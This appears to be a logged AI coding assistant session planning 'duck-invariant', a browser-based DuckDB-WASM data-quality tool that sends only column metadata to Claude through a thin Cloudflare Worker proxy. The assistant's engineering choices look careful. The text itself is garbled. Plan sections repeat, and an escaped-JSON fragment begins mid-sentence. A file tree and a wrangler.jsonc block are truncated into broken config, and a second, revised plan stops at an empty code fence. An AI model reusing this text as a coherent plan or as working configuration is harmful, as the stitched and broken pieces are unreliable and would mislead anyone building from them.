```

---

## Architecture

```
                    browser (all state, all compute)
  ┌──────────────────────────────────────────────────────────┐
  │  React UI ── zustand store                               │
  │      │                                                   │
  │      ├─ duckdb worker (jsDelivr eh bundle)               │
  │      │     registerFileURL / registerFileBuffer          │
  │      │     httpfs range reads on remote parquet          │
  │      │                                                   │
  │      └─ agent loop  ◀── owns the loop, owns redaction    │
  └───────────────────────┬──────────────────────────────────┘
                          │  POST /api/chat  (SSE down)
                  ┌───────▼────────┐
                  │ Cloudflare     │  Access gate (workers.dev)
                  │ Access         │
                  └───────┬────────┘
                  ┌───────▼────────┐
                  │ Hono Worker    │  owns system prompt, tool defs,
                  │ ~200 LOC       │  model allowlist, max_tokens
                  │ stateless      │  holds ANTHROPIC_API_KEY
                  └───────┬────────┘
                          │  @anthropic-ai/sdk  messages.stream()
                          ▼  claude-opus-5
```

**The Worker never loops.** One HTTP request = one assistant turn. The browser owns the agentic
loop: it reads `stop_reason === "tool_use"`, executes the tool against DuckDB locally, appends a
`tool_result`, and POSTs again. This is the manual-loop pattern from the `claude-api` skill, split
across the network boundary — and it's what keeps the Worker stateless and genuinely thin.

### Why the browser owns the loop

The product's central constraint is that no cell value ever leaves the browser. Owning the
transport end to end means the redaction boundary is **one function we can unit-test**, not
something buried inside a third-party SDK's message serialization. That is why we use
`@anthropic-ai/sdk` in the Worker plus a small hand-written client, rather than a
higher-level chat framework.

---

## The metadata contract (the core of the product)

`lib/profile/types.ts` defines `TableProfile` as the **only** thing that crosses the network.
Every field is a number, a column name, a SQL type name, or a derived shape string.

```ts
type ColumnClass = 'numeric' | 'temporal' | 'boolean' | 'string' | 'nested' | 'other';

interface ColumnProfile {
  name: string; ordinal: number; sqlType: string; class: ColumnClass;
  rowCount: number; nullCount: number; nullPct: number;
  approxDistinct: number; distinctPct: number; isCandidateKey: boolean;

  numeric?:  { min; max; avg; stddev; p01; p25; p50; p75; p99;
               zeroCount; negativeCount; nonFiniteCount };
  temporal?: { minISO; maxISO; spanDays; futureCount; epochZeroCount };
  boolean?:  { trueCount; falseCount };
  string?:   { lenMin; lenP50; lenMax; lenAvg;
               emptyCount; whitespaceOnlyCount; untrimmedCount;
               charClassPct: { alpha; digit; space; punct; other };
               distinctCaseInsensitive;          // casing-inconsistency signal
               shapes: { shape: string; count: number }[] };  // top 8
}
```

**Deliberate calls, both easy to flip later:**
- *Temporal min/max is included* — the user's chosen option was "aggregates for numeric/date
  columns only", and a 1970 min or a year-3000 max is the single most valuable data-quality
  signal there is.
- *String columns get shape histograms, never values.* A shape is `aaaa9@aaa.aa` —
  every letter mapped to `a`/`A`, every digit to `9`. Non-reversible.
  Note DuckDB's regex is RE2, which has **no backreferences**, so runs cannot be collapsed in
  SQL. Compute the raw shape in SQL, `GROUP BY` it, then collapse runs in TypeScript — the
  strings are already anonymized by then, so post-processing is safe.

**Enforcement, not just intent:** `lib/profile/redaction.ts` exports `assertNoValues(profile)`,
and a vitest case profiles a fixture seeded with known PII (real-looking emails, names, SSNs)
then asserts none of those literals appear anywhere in `JSON.stringify(profile)`. Column *names*
do cross the wire — unavoidable and expected under the chosen model.

### Tools (defined in the Worker, executed in the browser)

Shared zod schemas in `shared/tools.ts`; the Worker turns them into JSON Schema with zod 4's
built-in `z.toJSONSchema()` and marks each tool `strict: true`; the client re-validates inputs
with the same schema before touching DuckDB.

| Tool | Executes | Returns to Claude |
|---|---|---|
| `list_tables` | browser | names, row counts, column counts |
| `get_profile({table})` | browser | the `TableProfile` above |
| `run_sql({sql, purpose})` | browser | `{ ok, error?, rowCount, columns:[{name,type}], executionMs, truncated }` |

`run_sql` is the whole loop: Claude writes SQL, the browser runs it, **the user sees the rows in
the grid, and Claude sees only the shape and the error text.** Errors and row counts are metadata,
so Claude can still iterate its way to correct SQL without ever observing data. That contract is
the thing to get right; it's specified in `shared/tools.ts` and asserted in tests.

Profiles are fetched via tool call rather than stuffed into the system prompt, so context stays
small on wide schemas and multi-table sessions work naturally.

---

## Anthropic request shape

Per the `claude-api` skill (authoritative over recalled patterns):

- Model `claude-opus-5`, exact string, **no date suffix**. Allowlist in the Worker;
  `claude-sonnet-5` selectable in the UI.
- Thinking is **on by default** on Opus 5 — omit `thinking`, or pass
  `{ type: "adaptive", display: "summarized" }` to surface reasoning in the chat pane.
  `budget_tokens` is removed on this model and returns 400.
- `max_tokens: 64000` (streaming). Never `temperature`/`top_p` — removed on Opus 5, returns 400.
- **Refusal fallbacks on by default**, as the skill instructs for Opus 5 code:
  `betas: ["server-side-fallback-2026-07-01"]` + `fallbacks: "default"`. Say so in the README;
  drop it if you'd rather not.
- Always check `stop_reason` before reading `content`; `stop_details` is populated only on
  `"refusal"`. Guard `pause_turn` even though we declare no server tools.
- Prompt caching: `cache_control: {type:"ephemeral"}` on the last tool definition (caches
  tools + system prefix) and on the profile `tool_result`. Verify with
  `usage.cache_read_input_tokens` — the minimum cacheable prefix is 512–4096 tokens depending on
  model, and short prefixes silently don't cache. Don't claim it works until that field is non-zero.
- Pricing for the README: Opus 5 $5/$25 per MTok, Sonnet 5 $2/$10, 1M context.

**The Worker accepts only `messages` from the client.** System prompt, tool definitions, model
choice, and token caps are server-owned. Otherwise `/api/chat` is a free general-purpose Claude
proxy for anyone past Access.

### Wire protocol (SSE, one turn per request)

The Worker streams `client.messages.stream(...)`, forwards deltas live, and emits the assembled
final message at the end — so the client never has to reassemble partial `input_json_delta`
fragments, which is the fiddly part of client-side streaming.

```
event: text     data: {"delta":"..."}          ← live render
event: thinking data: {"delta":"..."}          ← if display:"summarized"
event: message  data: <full Anthropic.Message> ← once, from stream.finalMessage()
event: error    data: {"message":"..."}
```

Client imports `Anthropic.MessageParam` / `Anthropic.Message` **as types only** from
`@anthropic-ai/sdk` — no client instance, no key, in the browser.

---

## File layout

```
duck-invariant/
├─ next.config.ts          output:'export', images.unoptimized
├─ wrangler.jsonc          main: worker/index.ts, assets from ./out
├─ .dev.vars               ANTHROPIC_API_KEY          (gitignored)
├─ app/
│  ├─ layout.tsx  page.tsx  globals.css
├─ components/
│  ├─ ui/                  shadcn primitives
│  ├─ SourcePanel.tsx  ProfilePanel.tsx  SqlEditor.tsx
│  ├─ ResultsGrid.tsx  ChatPanel.tsx
├─ lib/
│  ├─ duckdb/
│  │  ├─ bundles.ts        ← THE swappable module (jsDelivr → R2)
│  │  ├─ client.ts         AsyncDuckDB singleton, Blob-URL worker shim
│  │  └─ sources.ts        registerFileURL / registerFileBuffer, format sniffing
│  ├─ profile/
│  │  ├─ types.ts  queries.ts  profile.ts  shapes.ts  redaction.ts
│  ├─ chat/
│  │  ├─ transport.ts      SSE reader
│  │  ├─ loop.ts           agentic loop + tool dispatch
│  ├─ arrow.ts             Arrow Table → virtualized row accessor
│  └─ store.ts             zustand
├─ shared/tools.ts         zod tool schemas — imported by BOTH sides
├─ worker/index.ts         Hono: /api/chat, /api/health
└─ test/
```

`lib/duckdb/bundles.ts` is the only file that knows where the wasm lives:

```ts
export async function resolveBundle() {
  const base = process.env.NEXT_PUBLIC_DUCKDB_BASE_URL;   // unset → jsDelivr
  return duckdb.selectBundle(base ? selfHostedBundles(base) : duckdb.getJsDelivrBundles());
}
```

Moving to R2 later = upload `duckdb-eh.wasm` + `duckdb-browser-eh.worker.js`, set that env var.

---

## Implementation phases

**1 — Scaffold.** `create-next-app` (TS, Tailwind, App Router, npm), then `output: 'export'`.
Install exact deps per the matrix; **pin `apache-arrow@17.0.0`**. `shadcn init`.

**2 — Worker + proxy, proven before any UI.** Hono with `/api/health` and `/api/chat`
(`streamSSE` from `hono/streaming`). `wrangler.jsonc`:

```jsonc
{
  "name": "duck-invariant",
  "main": "worker/index.ts",
  "compatibility_date": "2026-09-01",
  "compatibility_flags": ["nodejs_compat"],
  "assets": {
    "directory": "./out", "binding": "ASSETS",
    "not_found_handling": "single-page-application",
    "run_worker_first": ["/api/*"]
  }
}
```

Dev wiring: `rewrites` are unsupported under `output: 'export'`, so use
`NEXT_PUBLIC_API_BASE` (`http://127.0.0.1:8787` in dev, `''` in prod) plus Hono `cors()`
restricted to `localhost:3000` **and gated on a dev env var**. `npm run dev` runs
`next dev` + `wrangler dev` via `concurrently`. Gate: curl `/api/chat` and see tokens stream.

**3 — DuckDB layer.** `bundles.ts` → `client.ts` (jsDelivr + Blob-URL worker shim, the documented
pattern) → `sources.ts`. Remote URLs use `registerFileURL(..., DuckDBDataProtocol.HTTP, false)` so
DuckDB range-reads the Parquet instead of downloading it whole; local files use
`registerFileBuffer`. Sniff format by extension, then by content, and create a view per source.
Use the `eh` bundle — `coi` needs COOP/COEP, which we're not enabling (noted under Risks).

**4 — Profiler.** One chunked aggregate query per ~25 columns (not per column) for the core stats;
shape histograms for string columns run separately under `USING SAMPLE 50000 ROWS`, capped at ~20
string columns, so wide tables stay responsive. Then `assertNoValues` before anything is stored.

**5 — UI shell.** Three-pane workbench per the approved sketch: sources + profile rail, SQL editor
(CodeMirror 6) over a virtualized results grid, chat pane beneath.
**Grid: hand-rolled over `@tanstack/react-virtual`, not TanStack Table.** TanStack Table just went
v9 with a large API change; for a read-only virtualized grid the table library is more churn than
code. Profile panel flags suspicious columns (high null %, near-key-but-not, sentinel-looking
lengths, casing splits).

**6 — Chat + agent loop.** `transport.ts` (SSE) → `loop.ts` (dispatch tools, cap iterations,
abortable). `run_sql` results land in the grid for the user and are reduced to shape-only for
Claude, in one place.

**7 — Deploy.** `next build` → `wrangler deploy` → enable Access on the Worker → `wrangler secret
put ANTHROPIC_API_KEY`.

**8 — Tests + README.** Documented seams: R2 wasm hosting, session persistence (IndexedDB/OPFS),
and **invariant checks** — the repo's namesake and the obvious next feature. Claude proposes
predicates from the profile, the browser evaluates them, only pass/fail counts return. I'll add the
types and one hand-written passing check to prove the shape, but not a checks UI; say the word and
I'll build it out.

---

## Verification

1. `npm test` — profile SQL against a real fixture via duckdb-wasm's **Node** build (same SQL the
   browser runs); shape-collapsing; Arrow adapter; and the PII-leak assertion. Worker routes via
   Hono's `app.request()` (no `vitest-pool-workers` — it's unlikely to support vitest 5 yet).
2. `npm run dev`, load `https://shell.duckdb.org/data/tpch/0_01/parquet/lineitem.parquet`
   (verified CORS + ranges), confirm profile renders and `SELECT ... WHERE l_quantity < 0` runs.
3. Drop a local CSV; confirm the same path works via `registerFileBuffer`.
4. **Network-tab check as an explicit test step:** inspect the `/api/chat` request bodies and
   confirm no cell values appear. This is the product's central claim; verify it by eye once, not
   only in unit tests.
5. Ask Claude "which columns look suspicious?" and confirm it reasons from stats and writes SQL
   that lands in the editor.
6. Drive the deployed app with Chrome MCP for a screenshot; confirm an unauthenticated curl to the
   deployed `/api/chat` gets Access's login redirect, not a token stream.

## Risks and how each is handled

| Risk | Handling |
|---|---|
| Turbopack + duckdb-wasm/Arrow interop | #1 build risk. Client-only dynamic import; fall back to `transpilePackages: ['@duckdb/duckdb-wasm']`. Surfaced in phase 3, before UI work depends on it. |
| `typescript@7.0.2` is `latest` (Go compiler) | Use whatever `create-next-app` pins; if it grabs 7.x and Next/eslint/shadcn choke, drop to 5.9.x. |
| 34 MiB wasm (~10 MB brotli) first load | Expected; loading UI with progress. R2 + long-lived immutable cache when we self-host. |
| Single-threaded `eh` bundle | `coi` needs COOP/COEP site-wide; adds Safari trouble for a perf win we haven't measured. Revisit with real timings. |
| Prompt caching silently not applying | Assert on `usage.cache_read_input_tokens`; don't claim savings without it. |

- `wrangler login` (interactive — run `! wrangler login` in this session)
- An Anthropic API key for `.dev.vars`
- Zero Trust enabled on the Cloudflare account for the Access step

Assistant2026-09-08T00:12:49.772Z

Plan written. Summary of what I found that changed the design, beyond your seven choices:

  • The wasm can't be self-hosted on Workers — duckdb-eh.wasm is 34 MiB against a 25 MiB per-file asset cap. Confirmed by measuring the published bundle, not assumed. Hence jsDelivr behind a one-file swap.
  • apache-arrow must be pinned to exactly 17.0.0 — that's what duckdb-wasm depends on, not the current 21.x. Get this wrong and you ship two Arrow copies where every instanceof silently fails.
  • Access works on workers.dev with no custom domain, so there's no DNS prerequisite. It doesn't support WebSockets at Worker level, which is a reason the chat is SSE anyway.
  • The claude-api skill requires the official @anthropic-ai/sdk, not a higher-level chat framework. That suits this project: owning the transport means your "no cell values leave the browser" rule is one testable function rather than something inside a vendor's serializer.

Two places I made a judgment call rather than following the letter of your answer, both flagged in the plan and easy to flip: temporal min/max is included (a 1970 min is the highest-value data-quality signal there is, and your chosen option did say "numeric/date columns"), and run_sql returns error text and row counts to Claude — metadata, so it stays inside your rule, but it's what lets Claude fix its own broken SQL without ever seeing data.

One thing worth naming: the repo is called duck-invariant, and metadata-only + a client-side executor is exactly the right shape for invariant checking — Claude proposes predicates, the browser evaluates them, only pass/fail counts come back. I've built the seam and one example check but not a checks UI, since you said product details are still coming. Say the word and it's a short next step.

turn. The browser owns the agentic\nloop: it reads `stop_reason === \"tool_use\"`, executes the tool against DuckDB locally, appends a\n`tool_result`, and POSTs again. This is the manual-loop pattern from the `claude-api` skill, split\nacross the network boundary — and it's what keeps the Worker stateless and genuinely thin.\n\n### Why the browser owns the loop\n\nThe product's central constraint is that no cell value ever leaves the browser. Owning the\ntransport end to end means the redaction boundary is **one function we can unit-test**, not\nsomething buried inside a third-party SDK's message serialization. That is why we use\n`@anthropic-ai/sdk` in the Worker plus a small hand-written client, rather than a\nhigher-level chat framework.\n\n---\n\n## The metadata contract (the core of the product)\n\n`lib/profile/types.ts` defines `TableProfile` as the **only** thing that crosses the network.\nEvery field is a number, a column name, a SQL type name, or a derived shape string.\n\n```ts\ntype ColumnClass = 'numeric' | 'temporal' | 'boolean' | 'string' | 'nested' | 'other';\n\ninterface ColumnProfile {\n  name: string; ordinal: number; sqlType: string; class: ColumnClass;\n  rowCount: number; nullCount: number; nullPct: number;\n  approxDistinct: number; distinctPct: number; isCandidateKey: boolean;\n\n  numeric?:  { min; max; avg; stddev; p01; p25; p50; p75; p99;\n               zeroCount; negativeCount; nonFiniteCount };\n  temporal?: { minISO; maxISO; spanDays; futureCount; epochZeroCount };\n  boolean?:  { trueCount; falseCount };\n  string?:   { lenMin; lenP50; lenMax; lenAvg;\n               emptyCount; whitespaceOnlyCount; untrimmedCount;\n               charClassPct: { alpha; digit; space; punct; other };\n               distinctCaseInsensitive;          // casing-inconsistency signal\n               shapes: { shape: string; count: number }[] };  // top 8\n}\n```\n\n**Deliberate calls, both easy to flip later:**\n- *Temporal min/max is included* — the user's chosen option was \"aggregates for numeric/date\n  columns only\", and a 1970 min or a year-3000 max is the single most valuable data-quality\n  signal there is.\n- *String columns get shape histograms, never values.* A shape is `aaaa9@aaa.aa` —\n  every letter mapped to `a`/`A`, every digit to `9`. Non-reversible.\n  Note DuckDB's regex is RE2, which has **no backreferences**, so runs cannot be collapsed in\n  SQL. Compute the raw shape in SQL, `GROUP BY` it, then collapse runs in TypeScript — the\n  strings are already anonymized by then, so post-processing is safe.\n\n**Enforcement, not just intent:** `lib/profile/redaction.ts` exports `assertNoValues(profile)`,\nand a vitest case profiles a fixture seeded with known PII (real-looking emails, names, SSNs)\nthen asserts none of those literals appear anywhere in `JSON.stringify(profile)`. Column *names*\ndo cross the wire — unavoidable and expected under the chosen model.\n\n### Tools (defined in the Worker, executed in the browser)\n\nShared zod schemas in `shared/tools.ts`; the Worker turns them into JSON Schema with zod 4's\nbuilt-in `z.toJSONSchema()` and marks each tool `strict: true`; the client re-validates inputs\nwith the same schema before touching DuckDB.\n\n| Tool | Executes | Returns to Claude |\n|---|---|---|\n| `list_tables` | browser | names, row counts, column counts |\n| `get_profile({table})` | browser | the `TableProfile` above |\n| `run_sql({sql, purpose})` | browser | `{ ok, error?, rowCount, columns:[{name,type}], executionMs, truncated }` |\n\n`run_sql` is the whole loop: Claude writes SQL, the browser runs it, **the user sees the rows in\nthe grid, and Claude sees only the shape and the error text.** Errors and row counts are metadata,\nso Claude can still iterate its way to correct SQL without ever observing data. ## Approved Plan:
# duck-invariant — data quality & exploration tool

## Context

`/Users/dj/workspace/duck-invariant` is empty. We're building a browser-based data quality /
exploration tool: the user points at a CORS-enabled Parquet/CSV/JSON URL (or drops a local file),
it loads into DuckDB-WASM in a Web Worker, gets profiled, and can be queried both deterministically
(SQL editor) and conversationally (Claude). All state and compute live in the browser. The only
server is a thin inference proxy that holds the Anthropic API key. Hosted on Cloudflare Workers.

Product details beyond this foundation are still to come, so this plan builds the vertical slice
and leaves clearly-marked seams (invariant checks, R2-hosted wasm, session persistence) rather
than guessing at features.

### Decisions locked in with the user

| Question | Decision |
|---|---|
| Packaging | Next.js `output: 'export'` (pure static assets) + thin Hono Worker owning `/api/*` |
| Provider | Anthropic only |
| Key protection | Cloudflare Access in front of the Worker |
| What Claude sees | **Metadata only — structural + numeric.** No cell values, no min/max on strings, no top-k values, no row samples |
| DuckDB wasm hosting | jsDelivr now, behind a swappable module so R2 is a one-file change |
| UI | Tailwind v4 + shadcn/ui |
| Scope | Full vertical slice, deployed |

### Facts verified during planning (not assumed)

- **`duckdb-eh.wasm` is 34 MiB; Workers static assets cap at 25 MiB/file.** The wasm therefore
  *cannot* ship in the asset bundle — hence jsDelivr/R2. (mvp 39 MiB, coi 34 MiB.)
- **`@duckdb/duckdb-wasm` depends on `apache-arrow@^17.0.0`, not 21.x.** We must pin
  `apache-arrow@17.0.0` exactly, or two Arrow copies land in the bundle and every `instanceof`
  check silently fails.
- **Cloudflare Access protects a Worker on its `workers.dev` hostname — no custom domain needed.**
  Dashboard → Workers & Pages → the Worker → Access tab → "Protect this Worker behind Access".
  Covers workers.dev, preview URLs, custom domains and routes.
  *Caveat: Worker-level Access policies do not support WebSockets* — which is why chat uses SSE.
- `@opennextjs/cloudflare` was the alternative and does support Next 16.3.4; we're not using it.
- Demo data confirmed CORS-enabled with HTTP range support (`206`, `access-control-allow-origin: *`):
  `https://shell.duckdb.org/data/tpch/0_01/parquet/lineitem.parquet` and
  `https://blobs.duckdb.org/data/Star_Trek-Season_1.csv`.
- `pnpm` is broken on this machine (corepack can't fetch 12.3.4). **Use npm.**
- Not logged into wrangler yet — `wrangler login` is a prerequisite for deploy.

### Version matrix

```
next 16.3.4          react/react-dom 19.2.8   tailwindcss 4.3.3    shadcn CLI 4.21.0
@duckdb/duckdb-wasm 1.33.1-dev57.0            apache-arrow 17.0.0  (EXACT — see above)
@anthropic-ai/sdk 0.124.0                     hono 4.13.7          zod 4.5.4
zustand 5.0.15       @tanstack/react-virtual 3.14.11
@uiw/react-codemirror 4.25.11                 @codemirror/lang-sql 6.10.0
wrangler 4.129.1     @cloudflare/workers-types 5.20260907.1        vitest 5.0.0
concurrently 10.0.5
```

## Architecture

```
                    browser (all state, all compute)
  ┌──────────────────────────────────────────────────────────┐
  │  React UI ── zustand store                               │
  │      │                                                   │
  │      ├─ duckdb worker (jsDelivr eh bundle)               │
  │      │     registerFileURL / registerFileBuffer          │
  │      │     httpfs range reads on remote parquet          │
  │      │                                                   │
  │      └─ agent loop  ◀── owns the loop, owns redaction    │
  └───────────────────────┬──────────────────────────────────┘
                          │  POST /api/chat  (SSE down)
                  ┌───────▼────────┐
                  │ Cloudflare     │  Access gate (workers.dev)
                  │ Access         │
                  └───────┬────────┘
                  ┌───────▼────────┐
                  │ Hono Worker    │  owns system prompt, tool defs,
                  │ ~200 LOC       │  model allowlist, max_tokens
                  │ stateless      │  holds ANTHROPIC_API_KEY
                  └───────┬────────┘
                          │  @anthropic-ai/sdk  messages.stream()
                          ▼  claude-opus-5
```

**The Worker never loops.** One HTTP request = one assistant turn. The browser owns the agentic
loop: it reads `stop_reason === "tool_use"`, executes the tool against DuckDB locally, appends a
`tool_result`, and POSTs again. This is the manual-loop pattern from the `claude-api` skill, split
across the network boundary — and it's what keeps the Worker stateless and genuinely thin.

### Why the browser owns the loop

The product's central constraint is that no cell value ever leaves the browser. Owning the
transport end to end means the redaction boundary is **one function we can unit-test**, not
something buried inside a third-party SDK's message serialization. That is why we use
`@anthropic-ai/sdk` in the Worker plus a small hand-written client, rather than a
higher-level chat framework.

---

## The metadata contract (the core of the product)

`lib/profile/types.ts` defines `TableProfile` as the **only** thing that crosses the network.
Every field is a number, a column name, a SQL type name, or a derived shape string.

```ts
type ColumnClass = 'numeric' | 'temporal' | 'boolean' | 'string' | 'nested' | 'other';

interface ColumnProfile {
  name: string; ordinal: number; sqlType: string; class: ColumnClass;
  rowCount: number; nullCount: number; nullPct: number;
  approxDistinct: number; distinctPct: number; isCandidateKey: boolean;

  numeric?:  { min; max; avg; stddev; p01; p25; p50; p75; p99;
               zeroCount; negativeCount; nonFiniteCount };
  temporal?: { minISO; maxISO; spanDays; futureCount; epochZeroCount };
  boolean?:  { trueCount; falseCount };
  string?:   { lenMin; lenP50; lenMax; lenAvg;
               emptyCount; whitespaceOnlyCount; untrimmedCount;
               charClassPct: { alpha; digit; space; punct; other };
               distinctCaseInsensitive;          // casing-inconsistency signal
               shapes: { shape: string; count: number }[] };  // top 8
}
```

**Deliberate calls, both easy to flip later:**
- *Temporal min/max is included* — the user's chosen option was "aggregates for numeric/date
  columns only", and a 1970 min or a year-3000 max is the single most valuable data-quality
  signal there is.
- *String columns get shape histograms, never values.* A shape is `aaaa9@aaa.aa` —
  every letter mapped to `a`/`A`, every digit to `9`. Non-reversible.
  Note DuckDB's regex is RE2, which has **no backreferences**, so runs cannot be collapsed in
  SQL. Compute the raw shape in SQL, `GROUP BY` it, then collapse runs in TypeScript — the
  strings are already anonymized by then, so post-processing is safe.

**Enforcement, not just intent:** `lib/profile/redaction.ts` exports `assertNoValues(profile)`,
and a vitest case profiles a fixture seeded with known PII (real-looking emails, names, SSNs)
then asserts none of those literals appear anywhere in `JSON.stringify(profile)`. Column *names*
do cross the wire — unavoidable and expected under the chosen model.

### Tools (defined in the Worker, executed in the browser)

Shared zod schemas in `shared/tools.ts`; the Worker turns them into JSON Schema with zod 4's
built-in `z.toJSONSchema()` and marks each tool `strict: true`; the client re-validates inputs
with the same schema before touching DuckDB.

| Tool | Executes | Returns to Claude |
|---|---|---|
| `list_tables` | browser | names, row counts, column counts |
| `get_profile({table})` | browser | the `TableProfile` above |
| `run_sql({sql, purpose})` | browser | `{ ok, error?, rowCount, columns:[{name,type}], executionMs, truncated }` |

`run_sql` is the whole loop: Claude writes SQL, the browser runs it, **the user sees the rows in
the grid, and Claude sees only the shape and the error text.** Errors and row counts are metadata,
so Claude can still iterate its way to correct SQL without ever observing data. That contract is
the thing to get right; it's specified in `shared/tools.ts` and asserted in tests.

Profiles are fetched via tool call rather than stuffed into the system prompt, so context stays
small on wide schemas and multi-table sessions work naturally.

---

## Anthropic request shape

Per the `claude-api` skill (authoritative over recalled patterns):

- Model `claude-opus-5`, exact string, **no date suffix**. Allowlist in the Worker;
  `claude-sonnet-5` selectable in the UI.
- Thinking is **on by default** on Opus 5 — omit `thinking`, or pass
  `{ type: "adaptive", display: "summarized" }` to surface reasoning in the chat pane.
  `budget_tokens` is removed on this model and returns 400.
- `max_tokens: 64000` (streaming). Never `temperature`/`top_p` — removed on Opus 5, returns 400.
- **Refusal fallbacks on by default**, as the skill instructs for Opus 5 code:
  `betas: ["server-side-fallback-2026-07-01"]` + `fallbacks: "default"`. Say so in the README;
  drop it if you'd rather not.
- Always check `stop_reason` before reading `content`; `stop_details` is populated only on
  `"refusal"`. Guard `pause_turn` even though we declare no server tools.
- Prompt caching: `cache_control: {type:"ephemeral"}` on the last tool definition (caches
  tools + system prefix) and on the profile `tool_result`. Verify with
  `usage.cache_read_input_tokens` — the minimum cacheable prefix is 512–4096 tokens depending on
  model, and short prefixes silently don't cache. Don't claim it works until that field is non-zero.
- Pricing for the README: Opus 5 $5/$25 per MTok, Sonnet 5 $2/$10, 1M context.

**The Worker accepts only `messages` from the client.** System prompt, tool definitions, model
choice, and token caps are server-owned. Otherwise `/api/chat` is a free general-purpose Claude
proxy for anyone past Access.

### Wire protocol (SSE, one turn per request)

The Worker streams `client.messages.stream(...)`, forwards deltas live, and emits the assembled
final message at the end — so the client never has to reassemble partial `input_json_delta`
fragments, which is the fiddly part of client-side streaming.

```
event: text     data: {"delta":"..."}          ← live render
event: thinking data: {"delta":"..."}          ← if display:"summarized"
event: message  data: <full Anthropic.Message> ← once, from stream.finalMessage()
event: error    data: {"message":"..."}
```

Client imports `Anthropic.MessageParam` / `Anthropic.Message` **as types only** from
`@anthropic-ai/sdk` — no client instance, no key, in the browser.

├─ lib/
│  ├─ duckdb/
│  │  ├─ bundles.ts        ← THE swappable module (jsDelivr → R2)
│  │  ├─ client.ts         AsyncDuckDB singleton, Blob-URL worker shim
│  │  └─ sources.ts        registerFileURL / registerFileBuffer, format sniffing
│  ├─ profile/
│  │  ├─ types.ts  queries.ts  profile.ts  shapes.ts  redaction.ts
│  ├─ chat/
│  │  ├─ transport.ts      SSE reader
│  │  ├─ loop.ts           agentic loop + tool dispatch
│  ├─ arrow.ts             Arrow Table → virtualized row accessor
│  └─ store.ts             zustand
├─ shared/tools.ts         zod tool schemas — imported by BOTH sides
├─ worker/index.ts         Hono: /api/chat, /api/health
└─ test/
```

`lib/duckdb/bundles.ts` is the only file that knows where the wasm lives:

```ts
export async function resolveBundle() {
  const base = process.env.NEXT_PUBLIC_DUCKDB_BASE_URL;   // unset → jsDelivr
  return duckdb.selectBundle(base ? selfHostedBundles(base) : duckdb.getJsDelivrBundles());
}
```

Moving to R2 later = upload `duckdb-eh.wasm` + `duckdb-browser-eh.worker.js`, set that env var.

```jsonc

  "name": "duck-invariant",
  "main": "worker/index.ts",
  "compatibility_date": "2026-09-01",
  "compatibility_flags": ["nodejs_compat"],

  }

```

Dev wiring: `rewrites` are unsupported under `output: 'export'`, so use
`NEXT_PUBLIC_API_BASE` (`http://127.0.0.1:8787` in dev, `''` in prod) plus Hono `cors()`
restricted to `localhost:3000` **and gated on a dev env var**. `npm run dev` runs
`next dev` + `wrangler dev` via `concurrently`. Gate: curl `/api/chat` and see tokens stream.

**3 — DuckDB layer.** `bundles.ts` → `client.ts` (jsDelivr + Blob-URL worker shim, the documented
pattern) → `sources.ts`. Remote URLs use `registerFileURL(..., DuckDBDataProtocol.HTTP, false)` so
DuckDB range-reads the Parquet instead of downloading it whole; local files use
`registerFileBuffer`. Sniff format by extension, then by content, and create a view per source.
Use the `eh` bundle — `coi` needs COOP/COEP, which we're not enabling (noted under Risks).

**4 — Profiler.** One chunked aggregate query per ~25 columns (not per column) for the core stats;
shape histograms for string columns run separately under `USING SAMPLE 50000 ROWS`, capped at ~20
string columns, so wide tables stay responsive. Then `assertNoValues` before anything is stored.

**5 — UI shell.** Three-pane workbench per the approved sketch: sources + profile rail, SQL editor
(CodeMirror 6) over a virtualized results grid, chat pane beneath.
**Grid: hand-rolled over `@tanstack/react-virtual`, not TanStack Table.** TanStack Table just went
v9 with a large API change; for a read-only virtualized grid the table library is more churn than
code. Profile panel flags suspicious columns (high null %, near-key-but-not, sentinel-looking
lengths, casing splits).

**6 — Chat + agent loop.** `transport.ts` (SSE) → `loop.ts` (dispatch tools, cap iterations,
abortable). `run_sql` results land in the grid for the user and are reduced to shape-only for
Claude, in one place.

**7 — Deploy.** `next build` → `wrangler deploy` → enable Access on the Worker → `wrangler secret
put ANTHROPIC_API_KEY`.

**8 — Tests + README.** Documented seams: R2 wasm hosting, session persistence (IndexedDB/OPFS),
and **invariant checks** — the repo's namesake and the obvious next feature. Claude proposes
predicates from the profile, the browser evaluates them, only pass/fail counts return. I'll add the
types and one hand-written passing check to prove the shape, but not a checks UI; say the word and
I'll build it out.

# duck-invariant — falsifiable invariant detection over DuckDB-WASM

## Context

`/Users/dj/workspace/duck-invariant` is empty. Browser-based data-quality tool: point it at a
CORS-enabled Parquet/CSV/JSON URL (or drop a file), it validates the URL, loads into DuckDB-WASM,
profiles every column, then asks Claude to **propose falsifiable hypotheses** about the data. Each
hypothesis compiles to a check the browser evaluates locally — HOLDS or FALSIFIED with a violation
count. All state and compute in the browser; the only server is a thin proxy holding the API key.
Hosted on Cloudflare Workers.

**This is not a chat tool.** There is no conversation, no agent loop, no streaming. One request:
profile in → hypotheses out.

### Decisions

| | |
|---|---|
| Packaging | Next.js `output: 'export'` + thin Hono Worker owning `/api/*` |
| Model | `claude-sonnet-5`, hardcoded in the Worker. No model choice in the UI, no thinking display, no provider config. |
| Key protection | Cloudflare Access on the Worker's `workers.dev` hostname |
| What Claude sees | **Metadata only.** The `TableProfile` — no cell values, no string min/max, no top-k, no row samples |
| Transport | Single non-streaming JSON POST. Structured outputs, not tool use. |
| DuckDB wasm | jsDelivr, behind a swappable module (R2 later) |
| UI | Plain Tailwind. No component library, no SQL editor, no grid library. |

### Verified facts (measured, not assumed)

- `duckdb-eh.wasm` is **34 MiB**; Workers static assets cap at **25 MiB/file** → wasm cannot ship
  in the bundle. Hence jsDelivr.
- `@duckdb/duckdb-wasm` depends on **`apache-arrow@^17.0.0`**, not 21.x. Pin `17.0.0` exactly or
  two Arrow copies land in the bundle and every `instanceof` silently fails.
- **Cloudflare Access protects a Worker on `workers.dev` — no custom domain needed.**
- Structured outputs: `client.messages.parse()` + `zodOutputFormat` from
  `@anthropic-ai/sdk/helpers/zod`; available on the Claude API; SDK peer allows `zod@4`.
- Sonnet 5: thinking adaptive-only (`budget_tokens` → 400), `temperature`/`top_p` removed (→ 400),
  no mid-conversation system messages. Server-side refusal fallbacks are an Opus-5/Fable feature —
  not used here. $2/$10 per MTok.
- Demo data confirmed CORS + range (`206`, `access-control-allow-origin: *`):
  `https://shell.duckdb.org/data/tpch/0_01/parquet/lineitem.parquet`,
  `https://blobs.duckdb.org/data/Star_Trek-Season_1.csv`.
- `pnpm` broken on this machine → **npm**. Not logged into wrangler yet.

### Dependencies (deliberately small)

```
